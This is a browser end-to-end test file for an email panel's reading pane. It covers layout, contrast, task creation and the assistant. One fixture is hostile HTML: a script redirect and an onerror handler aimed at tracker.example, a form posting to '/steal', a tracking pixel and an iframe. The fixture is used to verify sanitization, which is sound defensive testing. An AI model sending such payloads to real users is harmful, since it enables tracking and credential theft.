// Web e2e: the Email panel over the assembled product. It boots the real
// FaberLoom rows, replaces the IMAP receiver with a fixture (external service),
// and measures the reading pane: beside the list on a wide viewport, one pane at
// a time on a narrow one, in both looks, with the email-to-task and from-zero
// gestures. No model call is involved.
import { mkdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import type { Browser, Page, Request } from 'playwright'
import { chromium } from 'playwright'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { launchWebScaffold, watchConsole, type WebScaffold } from './scaffold.ts'
import { connectFreshWorkspace, newEnglishPage } from './support.ts'

const OVERLAY = fileURLToPath(new URL('./email-panel.overlay.yml', import.meta.url))
const BUNDLE = fileURLToPath(new URL('../../../packages/bundle/faberloom-app/package.json', import.meta.url))
const SHOTS = fileURLToPath(new URL('../../../docs/scratch/faberloom-daily-work/e1/visual/', import.meta.url))
const ACTOR = { id: 'e2e@mwt.one', companyId: 'mwt' }
const SUBJECT = 'OC 4711 Eguisa'
const SECOND = 'Consulta de precio'
// The from-zero gesture is a new task each run; a unique title keeps the count
// honest against the scaffold's persistent store.
const SCRATCH_TITLE = `Tarea desde cero ${String(Date.now())}`

/** Hostile HTML a third party can send: scripts, a form, tracking and a link. */
const HOSTILE = [
  '<p>Hola desde el proveedor</p>',
  '<script>window.parent.__pwned = true; window.top.location = "https://tracker.example/pwn"</script>',
  '<img src="https://tracker.example/pixel.png" onerror="window.parent.__pwned = true">',
  '<form action="https://tracker.example/steal"><input name="dato"><button>Aprobar</button></form>',
  '<a href="https://tracker.example/x">enlace</a>',
  '<iframe src="https://tracker.example/frame"></iframe>',
  '<table style="width:1400px"><tr><td>tabla ancha que no debe empujar el panel</td></tr></table>',
].join('')

/** Parse `rgb()` / `rgba()` into channels. */
function channels(color: string): [number, number, number] | null {
  const match = /rgba?\(([^)]+)\)/.exec(color)
  if (match === null) return null
  const parts = (match[1] ?? '').split(',').map(part => Number.parseFloat(part.trim()))
  if (parts.length < 3) return null
  return [parts[0] ?? 0, parts[1] ?? 0, parts[2] ?? 0]
}

/** WCAG relative luminance. */
function luminance([r, g, b]: [number, number, number]): number {
  const channel = (value: number): number => {
    const scaled = value / 255
    return scaled <= 0.03928 ? scaled / 12.92 : ((scaled + 0.055) / 1.055) ** 2.4
  }
  return 0.2126 * channel(r) + 0.7152 * channel(g) + 0.0722 * channel(b)
}

/** WCAG contrast ratio between two colours. */
function ratio(foreground: string, background: string): number {
  const a = channels(foreground)
  const b = channels(background)
  if (a === null || b === null) throw new Error(`unparsable colour: ${foreground} / ${background}`)
  const [light, dark] = [luminance(a), luminance(b)].sort((x, y) => y - x) as [number, number]
  return (light + 0.05) / (dark + 0.05)
}

/** The connection the fixture refuses; set once the real row id is known. */
let failingConnection: string | undefined

/** The receiver the panel reads: an external service, replaced by a fixture. */
const inbound = {
  listPage: async (_owner: string, options: { limit?: number; page?: number }, connectionId?: string) => {
    // The second mailbox refuses the login, so the panel has to show one
    // account's mail and name the other's failure instead of hiding both.
    if (connectionId !== undefined && connectionId === failingConnection) {
      throw new Error('el servidor respondió NO: [AUTHENTICATIONFAILED] Invalid credentials')
    }
    const messages = [
      { uid: 1, messageId: '<a@x>', from: 'Compras Eguisa <compras@eguisa.example>', subject: SUBJECT, date: 'Tue, 18 Sep 2026 10:00:00 +0000', seen: false },
      { uid: 2, messageId: '<b@x>', from: 'Sonepar <pedidos@sonepar.example>', subject: SECOND, date: 'Mon, 17 Sep 2026 09:00:00 +0000', seen: true },
      { uid: 3, messageId: '<c@x>', from: 'Compras Eguisa <compras@eguisa.example>', subject: `Re: ${SUBJECT}`, date: 'Tue, 18 Sep 2026 08:00:00 +0000', seen: true },
    ]
    return {
      messages,
      total: messages.length,
      page: options.page ?? 1,
      pageSize: options.limit ?? 50,
      hasNext: false,
    }
  },
  listFolders: async () => [
    { name: 'INBOX', specialUse: 'inbox' as const },
    { name: 'Sent', specialUse: 'sent' as const },
    { name: 'Trash', specialUse: 'trash' as const },
    { name: 'INBOX.Mesa-Backups', specialUse: null },
  ],
  listInbox: async (_owner: string, _limit: number, connectionId?: string) => {
    if (connectionId !== undefined && connectionId === failingConnection) {
      throw new Error('el servidor respondió NO: [AUTHENTICATIONFAILED] Invalid credentials')
    }
    return [
      { uid: 1, messageId: '<a@x>', from: 'Compras Eguisa <compras@eguisa.example>', subject: SUBJECT, date: 'Tue, 18 Sep 2026 10:00:00 +0000', seen: false },
      { uid: 2, messageId: '<b@x>', from: 'Sonepar <pedidos@sonepar.example>', subject: SECOND, date: 'Mon, 17 Sep 2026 09:00:00 +0000', seen: true },
      { uid: 3, messageId: '<c@x>', from: 'Compras Eguisa <compras@eguisa.example>', subject: `Re: ${SUBJECT}`, date: 'Tue, 18 Sep 2026 08:00:00 +0000', seen: true },
    ]
  },
  readEmail: async () => ({ text: 'Hola, adjunto la orden de compra 4711.', html: null, attachments: [] }),
  searchMailbox: async () => ({ messages: [], connectionId: 'fixture', complete: true, scanned: 0, total: 0, matched: 0 }),
  markSeen: async () => true,
  moveToTrash: async () => 'Trash',
}

describe('web e2e: Email panel and task entries', () => {
  let scaffold: WebScaffold
  let browser: Browser
  let page: Page
  let tripwire: ReturnType<typeof watchConsole>
  let board: { list: (actor: unknown) => Promise<readonly { title: string }[]> }

  beforeAll(async () => {
    mkdirSync(SHOTS, { recursive: true })
    scaffold = await launchWebScaffold({ extraOverlayPath: OVERLAY, extraInstallAnchors: [BUNDLE] })
    ;(scaffold.ctx as unknown as { provide: (key: string, value: unknown) => void }).provide('faberloomInbound', inbound)
    // Two mailboxes: one answers, the other refuses. The panel must show the
    // first one's mail and name the second one's failure.
    const connections = (scaffold.ctx as unknown as {
      faberloomConnections: { save: (owner: string, input: Record<string, unknown>) => Promise<{ id: string }> }
    }).faberloomConnections
    await connections.save(ACTOR.id, {
      kind: 'imap', label: 'Compras', host: 'imap.compras.test', port: 993, secure: true,
      username: 'alejandro@muitowork.com', secret: 'sintetico-a', primary: true,
    })
    const ventas = await connections.save(ACTOR.id, {
      kind: 'imap', label: 'Ventas', host: 'imap.ventas.test', port: 993, secure: true,
      username: 'ventas@mwt.one', secret: 'sintetico-b',
    })
    failingConnection = ventas.id
    // One live agent, so the assistant's @ menu has a real choice.
    await (scaffold.ctx as unknown as {
      faberloomAgents: { createAgent: (input: Record<string, unknown>) => Promise<unknown> }
    }).faberloomAgents.createAgent({ name: 'Proformas', responsibility: 'Cotizaciones y condiciones comerciales' })
    // One Space names the sender, so the assistant can offer to link the mail.
    await (scaffold.ctx as unknown as {
      faberloomSpaces: { create: (actor: Record<string, unknown>, input: { title: string }) => Promise<unknown> }
    }).faberloomSpaces.create(
      { id: 'e2e@mwt.one', kind: 'human', role: 'admin', readOnly: false, companyId: 'mwt' },
      { title: 'Eguisa' },
    )
    board = (scaffold.ctx as unknown as { faberloomBoard: typeof board }).faberloomBoard

    browser = await chromium.launch()
    page = await newEnglishPage(browser)
    page.setDefaultTimeout(15_000)
    page.on('pageerror', (error) => { console.log('PAGEERROR', String(error)) })
    page.on('console', (message) => { if (message.type() === 'error') console.log('CONSOLE', message.text()) })
    tripwire = watchConsole(page)
    await page.goto(scaffold.authenticatedUrl, { waitUntil: 'load' })
    try {
      await page.waitForSelector('[class*="frame"]', { timeout: 30_000 })
    } catch (error: unknown) {
      await page.screenshot({ path: `${SHOTS}boot-failure.png` })
      console.log('BOOT BODY', ((await page.textContent('body')) ?? '').slice(0, 1200))
      throw error
    }
    await connectFreshWorkspace(page, scaffold.workspaceCwd)
  }, 180_000)

  afterAll(async () => {
    await browser?.close()
    await scaffold?.close()
  })

  /** Open the Email panel and select the first message. */
  async function openMail(): Promise<void> {
    // The mail row lives in its own Emails group; expand it when collapsed.
    if (await page.getByRole('button', { name: /^Email$/u }).count() === 0) {
      const group = page.getByRole('button', { name: /^Emails/u }).first()
      if (await group.count() > 0) await group.click()
    }
    const nav = page.getByRole('button', { name: /^Email$/u }).first()
    if (await nav.count() === 0) {
      console.log('NAV BUTTONS', (await page.getByRole('button').allTextContents()).slice(0, 60).join(' | '))
      await page.screenshot({ path: `${SHOTS}nav-debug.png` })
    }
    await nav.click()
    await page.getByText(SUBJECT, { exact: false }).first().waitFor()
    await page.getByText(SUBJECT, { exact: false }).first().click()
    await page.locator('aside[aria-label="Email"]').waitFor()
  }

  /** The look the panel currently paints, from the preference it stores. */
  async function currentLook(): Promise<string> {
    return await page.evaluate(() => window.localStorage.getItem('faberloom.email.look') ?? 'a')
  }

  /** Switch the surface at a wide viewport, where the control is visible. */
  async function useLook(target: 'a' | 'b'): Promise<void> {
    if (await currentLook() === target) return
    await page.getByRole('button', { name: 'Change look' }).click()
    await expect.poll(currentLook).toBe(target)
  }

  it('reads beside the list on wide, one pane on narrow, in both looks, and opens tasks once', async () => {
    await page.setViewportSize({ width: 1440, height: 900 })
    await useLook('a')
    await openMail()

    const listBox = await page.getByRole('list', { name: 'Inbox' }).first().boundingBox()
    const readerBox = await page.locator('aside[aria-label="Email"]').boundingBox()
    expect(listBox).not.toBeNull()
    expect(readerBox).not.toBeNull()
    if (listBox !== null && readerBox !== null) {
      expect(readerBox.x).toBeGreaterThan(listBox.x + listBox.width / 2)
      expect(readerBox.width).toBeGreaterThan(200)
    }
    const reader = page.locator('aside[aria-label="Email"]')
    await reader.getByRole('heading', { name: SUBJECT }).waitFor()
    // One account answered and the other failed: both facts are on screen.
    await page.getByText(/Could not read ventas@mwt\.one/u).waitFor()
    expect(await page.getByRole('button', { name: /alejandro@muitowork\.com/u }).count()).toBeGreaterThan(0)
    // One unread row, one read: the dot is the list's, not a decoration.
    const dots = await page.locator('[class*="mailListDot"]:not([class*="Spacer"])').count()
    expect(dots).toBe(1)
    await page.screenshot({ path: `${SHOTS}email-wide-look-a.png`, fullPage: false })

    // Narrow, look A: the reader replaces the list, then closing returns to it.
    await page.setViewportSize({ width: 420, height: 800 })
    // Let the viewport resize reach the media query before measuring.
    await page.waitForTimeout(500)
    await page.getByText(SECOND).waitFor({ state: 'hidden' })
    expect((await reader.boundingBox())?.width ?? 0).toBeGreaterThan(380)
    await page.screenshot({ path: `${SHOTS}email-narrow-reader-a.png`, fullPage: false })
    await reader.getByRole('button', { name: 'Close' }).first().click()
    await page.getByText(SECOND).waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}email-narrow-list-a.png`, fullPage: false })
    const overflowA = await page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflowA).toBeLessThanOrEqual(1)

    // Wide again, look B, then narrow in look B.
    await page.setViewportSize({ width: 1440, height: 900 })
    await openMail()
    await reader.getByRole('heading', { name: SUBJECT }).waitFor()
    await useLook('b')
    await page.screenshot({ path: `${SHOTS}email-wide-look-b.png`, fullPage: false })

    await page.setViewportSize({ width: 420, height: 800 })
    await page.waitForTimeout(500)
    await page.getByText(SECOND).waitFor({ state: 'hidden' })
    await page.screenshot({ path: `${SHOTS}email-narrow-reader-b.png`, fullPage: false })
    await reader.getByRole('button', { name: 'Close' }).first().click()
    await page.getByText(SECOND).waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}email-narrow-list-b.png`, fullPage: false })
    const overflowB = await page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflowB).toBeLessThanOrEqual(1)

    // From the mail, twice: one task. Wide, back on look A.
    await page.setViewportSize({ width: 1440, height: 900 })
    await useLook('a')
    await openMail()
    const beforeTasks = (await board.list(ACTOR)).filter(item => item.title === SUBJECT).length
    await page.getByRole('button', { name: 'Create task' }).first().click()
    await page.getByText(`Task created: ${SUBJECT}`).waitFor({ state: 'visible' })
    await page.getByRole('button', { name: 'Create task' }).first().click()

    // From zero.
    const mesa = page.getByRole('button', { name: /Mesa de trabajo|Work bench/u }).first()
    if (await mesa.count() === 0) {
      const work = page.getByRole('button', { name: /^Work/u }).first()
      if (await work.count() > 0) await work.click()
    }
    await page.getByRole('button', { name: /Mesa de trabajo|Work bench/u }).first().click()
    await page.getByRole('button', { name: 'New task' }).click()
    await page.getByRole('textbox', { name: 'Task title' }).fill(SCRATCH_TITLE)
    await page.getByRole('button', { name: 'Create', exact: true }).click()
    await page.getByText(SCRATCH_TITLE).first().waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}mesa-scratch-task.png`, fullPage: false })

    const titles = (await board.list(ACTOR)).map(item => item.title)
    // The scaffold persists across runs, so the honest check is the delta:
    // two clicks on this mail add exactly one task.
    expect(titles.filter(title => title === SUBJECT).length - beforeTasks).toBe(1)
    expect(titles.filter(title => title === SCRATCH_TITLE)).toHaveLength(1)
    expect(tripwire.pageErrors).toEqual([])
  }, 180_000)

  it('measures the contrast of the new panel in both looks', async () => {
    const failures: string[] = []
    const pairs = [
      { name: 'cuerpo', selector: '[class*="mailReaderText"]' },
      { name: 'remitente', selector: '[class*="mailReaderName"]' },
      { name: 'direccion', selector: '[class*="mailReaderAddress"]' },
      { name: 'contador del rail', selector: '[class*="emailRailCount"]' },
      { name: 'remitente no leido', selector: '[class*="mailListFromUnread"]' },
      { name: 'asunto no leido', selector: '[class*="mailListSubjectUnread"]' },
    ] as const
    for (const look of ['a', 'b'] as const) {
      await page.setViewportSize({ width: 1440, height: 900 })
      await useLook(look)
      await openMail()
      await page.locator('[class*="mailReaderText"]').first().waitFor()
      for (const pair of pairs) {
        // The reader re-renders while the list refetches after a look switch;
        // measure on a settled frame instead of racing the remount.
        let colours: { fg: string; bg: string } | undefined
        for (let attempt = 0; attempt < 4 && colours === undefined; attempt += 1) {
          colours = await page.evaluate((selector: string) => {
            const element = document.querySelector(selector)
            if (element === null) return undefined
            const style = getComputedStyle(element)
            let node: Element | null = element
            let background = 'rgba(0, 0, 0, 0)'
            while (node !== null) {
              const value = getComputedStyle(node).backgroundColor
              if (value !== 'rgba(0, 0, 0, 0)' && value !== 'transparent') {
                background = value
                break
              }
              node = node.parentElement
            }
            return { fg: style.color, bg: background }
          }, pair.selector).catch(() => undefined)
          if (colours === undefined) await page.waitForTimeout(250)
        }
        if (colours === undefined) { failures.push(`${look} ${pair.name}: missing`); continue }
        const value = ratio(colours.fg, colours.bg)
        if (value < 4.5) failures.push(`${look} ${pair.name}: ${value.toFixed(2)}`)
      }
    }
    expect(failures).toEqual([])
  }, 120_000)

  it('isolates hostile HTML in the real browser: no script, no form, no remote request', async () => {
    const original = inbound.readEmail
    inbound.readEmail = async () => ({ text: '', html: HOSTILE, attachments: [] })
    const requests: string[] = []
    const onRequest = (request: Request): void => { requests.push(request.url()) }
    page.on('request', onRequest)
    try {
      await page.setViewportSize({ width: 1440, height: 900 })
      await openMail()
      // The second message has not been read in this run, so the body is fetched
      // with the hostile fixture instead of a cached text body.
      await page.getByText(SECOND, { exact: false }).first().click()
      const frame = page.frameLocator('iframe[title="Body"]')
      await frame.getByText('Hola desde el proveedor').waitFor()
      const iframe = page.locator('iframe[title="Body"]')
      const srcdoc = (await iframe.getAttribute('srcdoc')) ?? ''
      expect(srcdoc).toContain('Content-Security-Policy')
      expect(srcdoc).not.toContain('<script')
      expect(srcdoc).not.toContain('<form')
      expect(srcdoc).not.toContain('tracker.example')
      expect(await iframe.getAttribute('sandbox')).toBe('')
      // A wide body must scroll inside the frame, never widen the panel.
      const asideBox = await page.locator('aside[aria-label="Email"]').boundingBox()
      const frameBox = await iframe.boundingBox()
      expect(asideBox).not.toBeNull()
      expect(frameBox).not.toBeNull()
      if (asideBox !== null && frameBox !== null) {
        expect(frameBox.x + frameBox.width).toBeLessThanOrEqual(asideBox.x + asideBox.width + 1)
      }
      const pageOverflow = await page.evaluate(() =>
        document.documentElement.scrollWidth - document.documentElement.clientWidth)
      expect(pageOverflow).toBeLessThanOrEqual(1)
      // Nothing from the hostile origin reached the network, and nothing ran.
      await page.waitForTimeout(600)
      expect(requests.filter(url => url.includes('tracker.example'))).toEqual([])
      expect(await page.evaluate(() => (window as { __pwned?: boolean }).__pwned ?? null)).toBeNull()
      expect(await page.locator('article form').count()).toBe(0)
      await page.screenshot({ path: `${SHOTS}email-hostile.png`, fullPage: false })
    } finally {
      inbound.readEmail = original
      page.off('request', onRequest)
    }
  }, 120_000)

  it('offers the mail views and opens the floating assistant on an open mail', async () => {
    await page.setViewportSize({ width: 1440, height: 900 })
    await openMail()
    const viewNames = [/important|importantes/iu, /awaiting reply|esperando respuesta/iu, /categories|categorías/iu, /flagged|marcados/iu]
    for (const name of viewNames) {
      await page.getByRole('button', { name }).first().waitFor()
    }
    const fab = page.getByRole('button', { name: /mail assistant|asistente de correo/iu }).first()
    await fab.waitFor()
    await fab.click()
    await page.locator('section[aria-label]').filter({ hasText: /mail assistant|asistente de correo/iu }).first().waitFor()
    // The reply to the first mail groups under one thread header.
    await page.getByText(/thread · 2 messages|hilo · 2 mensajes/iu).waitFor()
    // The automatic summary asks silently: the model failure is visible, the prompt is not.
    await page.getByRole('alert').first().waitFor()
    expect(await page.getByText(/Summarize this email|Resume este correo/iu).count()).toBe(0)
    // Cards derive from this mail: the matching Space, the thread, and a commercial reply.
    await page.getByText(/belongs to the Space|pertenece al Space/iu).waitFor()
    await page.getByRole('button', { name: /link to eguisa|enlazar a eguisa/iu }).waitFor()
    await page.getByRole('button', { name: /summarize the thread|resumir el hilo/iu }).waitFor()
    await page.getByRole('button', { name: /prepare a commercial reply|preparar respuesta comercial/iu }).waitFor()
    // The dock fades in; capture the settled surface, not mid-animation.
    await page.waitForTimeout(300)
    await page.screenshot({ path: `${SHOTS}email-assistant-dock.png`, fullPage: false })
    expect(await page.getByRole('button', { name: /^Summary$|^Resumen$/u }).count()).toBe(0)
    await page.getByRole('combobox', { name: /model|modelo/iu }).waitFor()
    await page.getByRole('button', { name: /expand|ampliar/iu }).click()
    await page.locator('section[class*="emailAssistantPanelExpanded"]').waitFor()
    await page.getByRole('textbox', { name: /ask about this email|pregunta sobre este correo/iu }).fill('@')
    await page.getByRole('button', { name: 'Proformas' }).waitFor()
    await page.getByRole('button', { name: 'Proformas' }).click()
    await page.getByText('@Proformas').waitFor()
    await page.getByText(/with tools|con herramientas/iu).waitFor()
    expect(await page.getByRole('button', { name: /^(send|enviar)$/iu }).isDisabled()).toBe(true)
    await page.waitForTimeout(300)
    await page.screenshot({ path: `${SHOTS}email-assistant.png`, fullPage: false })
    // Leave the reader as it was; the next case opens the same mail.
    await page.locator('section[aria-label="Mail assistant"]').getByRole('button', { name: /close|cerrar/iu }).click()
    // The rail opens on demand, and the reader groups the reply under its thread.
    await page.getByRole('button', { name: /^alejandro@/iu }).click()
    await page.getByRole('button', { name: /^(categories|categorías)/iu }).first().click()
    await page.getByText(/thread · 2 messages|hilo · 2 mensajes/iu).click()
    await page.waitForTimeout(200)
    await page.screenshot({ path: `${SHOTS}email-thread.png`, fullPage: false })
  }, 120_000)

  it('keeps both attachment arrows inside the reader and scrolls forward', async () => {
    const original = inbound.readEmail
    inbound.readEmail = async () => ({
      text: '',
      html: null,
      attachments: [
        { name: 'factura.pdf', mediaType: 'application/pdf', size: 69_400 },
        { name: 'detalle.xml', mediaType: 'application/xml', size: 9_900 },
        { name: 'anexo.pdf', mediaType: 'application/pdf', size: 90_400 },
      ],
    })
    try {
      await page.setViewportSize({ width: 1440, height: 900 })
      // A previous test may have left the reader open on this same message;
      // close it so the fixture's readEmail runs again with the attachments.
      const close = page.locator('aside[aria-label="Email"]').getByRole('button', { name: /close|cerrar/iu }).first()
      if (await close.count() > 0) await close.click()
      await openMail()
      // Accounts and categories start collapsed; a previous case may have left
      // the global category list open, so only click when the folder is hidden.
      if (await page.getByText('Mesa-Backups', { exact: true }).count() === 0) {
        await page.getByRole('button', { name: /^(categories|categorías)/iu }).first().click()
      }
      // The rail owns the account context: an `INBOX.` folder prefix is noise.
      await page.getByText('Mesa-Backups', { exact: true }).first().waitFor()
      expect(await page.getByText('INBOX.Mesa-Backups', { exact: true }).count()).toBe(0)
      // The long account address truncates, but its count stays inside the row.
      const railOverflow = await page.evaluate(() => (
        [...document.querySelectorAll('[class*="emailRailRow"], [class*="emailRailActive"]')]
          .filter(element => element.scrollWidth > element.clientWidth + 1)
          .map(element => element.textContent ?? '')
      ))
      expect(railOverflow).toEqual([])
      const next = page.getByRole('button', { name: /next attachment|adjunto siguiente/iu })
      await next.waitFor()
      const asideBox = await page.locator('aside[aria-label="Email"]').boundingBox()
      const nextBox = await next.boundingBox()
      expect(asideBox).not.toBeNull()
      expect(nextBox).not.toBeNull()
      if (asideBox !== null && nextBox !== null) {
        // The forward arrow used to fall outside the clipped reader, so only
        // scrolling back was possible.
        expect(nextBox.x + nextBox.width).toBeLessThanOrEqual(asideBox.x + asideBox.width + 1)
      }
      const track = page.locator('[class*="mailAttachmentTrack"]').first()
      const before = await track.evaluate(element => element.scrollLeft)
      await next.click()
      await page.waitForTimeout(450)
      const after = await track.evaluate(element => element.scrollLeft)
      expect(after).toBeGreaterThan(before)
      await page.screenshot({ path: `${SHOTS}email-attachments.png`, fullPage: false })
    } finally {
      inbound.readEmail = original
    }
  }, 120_000)
})
